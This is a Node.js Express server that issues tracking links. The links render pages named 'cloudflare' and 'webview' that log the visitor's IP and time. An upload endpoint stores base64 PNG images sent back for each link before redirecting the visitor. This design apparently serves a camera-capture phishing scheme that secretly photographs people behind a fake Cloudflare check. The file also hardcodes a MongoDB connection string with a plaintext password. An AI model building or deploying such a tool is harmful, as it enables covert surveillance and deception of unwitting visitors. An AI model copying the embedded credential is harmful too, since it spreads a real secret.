require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const fs = require('fs');

const app = express();

mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://dartmino64:CXd21bYqriwfgtUN@cluster0.p7eujjb.mongodb.net/urlcapture?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const urlSchema = new mongoose.Schema({
  originalUrl: String,
  uniqueId: String,
  redirectUrl: String,
  imagePath: String
});
const Url = mongoose.model('Url', urlSchema);

app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');

app.post('/generate', async (req, res) => {
  try {
    const { originalUrl, redirectUrl } = req.body;
    const uniqueId = Math.random().toString(36).substring(7);
    const url = new Url({ originalUrl, uniqueId, redirectUrl });
    await url.save();
    console.log('URL saved:', url);

    const host = req.get('host');
    const cloudflareUrl = `https://${host}/c/${uniqueId}`;
    const webViewUrl = `https://${host}/w/${uniqueId}`;

    res.json({ cloudflareUrl, webViewUrl });
  } catch (error) {
    console.error('Error generating URL:', error);
    res.status(500).send('Server error');
  }
});

app.get('/c/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const url = await Url.findOne({ uniqueId: id });
    if (url) {
      res.render('cloudflare', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host') });
    } else {
      res.status(404).send('Not Found');
    }
  } catch (error) {
    console.error('Error fetching URL:', error);
    res.status(500).send('Server error');
  }
});

app.get('/w/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const url = await Url.findOne({ uniqueId: id });
    if (url) {
      res.render('webview', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host'), url: url.redirectUrl });
    } else {
      res.status(404).send('Not Found');
    }
  } catch (error) {
    console.error('Error fetching URL:', error);
    res.status(500).send('Server error');
  }
});

app.post('/upload', async (req, res) => {
  try {
    const imageData = req.body.image;
    const id = req.body.id;
    const base64Data = imageData.replace(/^data:image\/png;base64,/, '');
    const filePath = path.join(__dirname, 'uploads', `image_${Date.now()}.png`);

    fs.writeFile(filePath, base64Data, 'base64', async (err) => {
      if (err) {
        return res.status(500).send('Error saving image');
      }
      const url = await Url.findOne({ uniqueId: id });
      if (url) {
        url.imagePath = filePath;
        await url.save();
        res.json({ redirectUrl: url.redirectUrl });
      } else {
        res.status(404).send('Not Found');
      }
    });
  } catch (error) {
    console.error('Error uploading image:', error);
    res.status(500).send('Server error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
